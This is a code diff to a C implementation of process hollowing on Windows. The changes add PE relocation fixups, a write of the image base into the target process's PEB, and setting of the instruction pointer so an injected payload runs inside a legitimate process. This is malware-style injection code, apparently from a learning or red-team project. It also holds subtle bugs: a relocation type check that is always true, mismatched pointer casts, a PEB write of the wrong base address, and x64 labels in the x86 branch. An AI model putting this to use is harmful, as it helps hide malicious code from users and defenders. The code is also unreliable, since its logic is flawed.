@@ -4,6 +4,45 @@
 
 typedef NTSTATUS (WINAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
 
+void PerformRelocation(PVOID pPayloadBuffer, PVOID pRemoteAddr, PPAYLOAD_INFO pPayload) {
+    // Calculate the difference between the intended and actual addresses
+    ULONG_PTR delta = (ULONG_PTR)pRemoteAddr - pPayload->imageBase;
+    
+    // No relocation needed
+    if (delta ==  0)
+        return;
+
+    // Get the relocation directory from the optional header
+    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pPayloadBuffer + ((PIMAGE_DOS_HEADER)pPayloadBuffer)->e_lfanew);
+    PIMAGE_DATA_DIRECTORY pRelocDir = &pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+
+    // No relocation table found
+    if (pRelocDir->Size == 0)
+        return;
+
+    PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pPayloadBuffer + pRelocDir->VirtualAddress);
+
+    while (pReloc->VirtualAddress != 0) {
+        DWORD entriesCount = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
+        PWORD pEntry = (PWORD)((PBYTE)pReloc + sizeof(IMAGE_BASE_RELOCATION));
+
+        for (DWORD i = 0 ; i < entriesCount ; i++) {
+            // The 4 MSBs are the type, 12 LSB are the offset
+            int type = pEntry[i] >> 12;
+            int offset = pEntry[i] & 0xFFF;
+
+            // Only address x64 (DIR64) or x86 (HIGHLOW) relocations
+            if (type == IMAGE_REL_BASED_DIR64 || IMAGE_REL_BASED_HIGHLOW) {
+                // Address in the payload buffer that needs fixing
+                PULONG_PTR pPatchAddr = (PULONG)((PBYTE)pPayloadBuffer + pReloc->VirtualAddress + offset);
+                *pPatchAddr += delta;
+            }
+        }
+        // Move to the next relocation block
+        pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc->SizeOfBlock);
+    }
+}
+
 BOOL RunProcessHollowing(PPROCESS_INFORMATION pTargetInfo, PPAYLOAD_INFO pPayload) {
     /* Get initial thread context
      * Before we can hollow the process, we need to know where it is.
@@ -79,6 +118,8 @@ BOOL RunProcessHollowing(PPROCESS_INFORMATION pTargetInfo, PPAYLOAD_INFO pPayloa
 
     printf("Allocated %lu bytes at 0x%p in target process\n", pPayload->size, pRemoteAddr);
 
+    PerformRelocation(pPayload->buffer, pRemoteAddr, pPayload);
+
     if (!WriteProcessMemory(pTargetInfo->hProcess, pRemoteAddr, pPayload->buffer,
         pPayload->nt->OptionalHeader.SizeOfHeaders, NULL)) {
             fprintf(stderr, "Error: Couldn't write headers (Error: %lu)\n", GetLastError());
@@ -87,6 +128,7 @@ BOOL RunProcessHollowing(PPROCESS_INFORMATION pTargetInfo, PPAYLOAD_INFO pPayloa
 
     // write each section of the binary (.text, .data, .bss, etc...)
     for (int i = 0 ; i < pPayload->nt->FileHeader.NumberOfSections ; i++) {
+        
         // Find section header (skip the NT_HEADERS, where we start and then go to the current section)
         PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)(
             (PBYTE)pPayload->nt + 
@@ -131,10 +173,22 @@ BOOL RunProcessHollowing(PPROCESS_INFORMATION pTargetInfo, PPAYLOAD_INFO pPayloa
      * It'll get the current state of the main thread and change its IP
      */
     #ifdef _M_X64
+        if (!WriteProcessMemory(pTargetInfo->hProcess, (PVOID)(ctx.Rdx + 0x10),
+                &pPayload->imageBase, sizeof(pPayload->imageBase), NULL)) {
+                    fprintf(stderr, "Error: Couldn't write new imgae base to PEB (Error: %lu)\n", GetLastError());
+                    return FALSE;
+        }
         ctx.Rcx = (DWORD64)((PBYTE)pRemoteAddr + pPayload->entryPointRVA);
+        ctx.Rip = (DWORD64)((PBYTE)pRemoteAddr + pPayload->entryPointRVA);
         printf("Setting x64 RIP to: 0x%p\n", (PVOID)ctx.Rcx);
     #else
+        if (!WriteProcessMemory(pTargetInfo->hProcess, (PVOID)(ctx.Eax + 0x08),
+                &pPayload->imageBase, sizeof(pPayload->imageBase), NULL)) {
+                    fprintf(stderr, "Error: Couldn't write new imgae base to PEB (Error: %lu)\n", GetLastError());
+                    return FALSE;
+        }
         ctx.Eax = (DWORD64)((PBYTE)pRemoteAddr + pPayload->entryPointRVA);
+        ctx.Eip = (DWORD64)((PBYTE)pRemoteAddr + pPayload->entryPointRVA);
         printf("Setting x64 EIP to: 0x%p\n", (PVOID)ctx.Eax);
     #endif
 
